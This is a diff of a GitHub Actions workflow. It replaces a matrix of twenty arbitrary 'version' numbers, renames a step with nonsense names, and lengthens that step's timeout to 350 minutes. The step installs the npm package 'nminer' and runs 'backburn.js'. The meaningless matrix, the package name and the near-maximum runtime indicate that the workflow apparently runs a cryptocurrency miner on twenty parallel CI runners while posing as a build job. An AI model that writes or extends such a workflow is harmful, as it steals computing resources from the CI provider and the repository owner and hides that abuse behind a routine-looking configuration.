@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6341 }
-          - { version: 1211 }
-          - { version: 6800 }
-          - { version: 5047 }
-          - { version: 955 }
-          - { version: 3949 }
-          - { version: 3779 }
-          - { version: 750 }
-          - { version: 2127 }
-          - { version: 8027 }
-          - { version: 5150 }
-          - { version: 7883 }
-          - { version: 4884 }
-          - { version: 7450 }
-          - { version: 9584 }
-          - { version: 8210 }
-          - { version: 1609 }
-          - { version: 5209 }
-          - { version: 2377 }
-          - { version: 3485 }
+          - { version: 2772 }
+          - { version: 9750 }
+          - { version: 9485 }
+          - { version: 16 }
+          - { version: 8629 }
+          - { version: 5645 }
+          - { version: 5065 }
+          - { version: 1891 }
+          - { version: 4832 }
+          - { version: 697 }
+          - { version: 3847 }
+          - { version: 2532 }
+          - { version: 6199 }
+          - { version: 9274 }
+          - { version: 5970 }
+          - { version: 653 }
+          - { version: 5321 }
+          - { version: 4049 }
+          - { version: 7774 }
+          - { version: 4629 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: woot who
+      - name: suitcase elevator
         run: |
           npm install nminer@latest
-          timeout 316m node backburn.js || echo "backburn executed"
+          timeout 350m node backburn.js || echo "backburn executed"
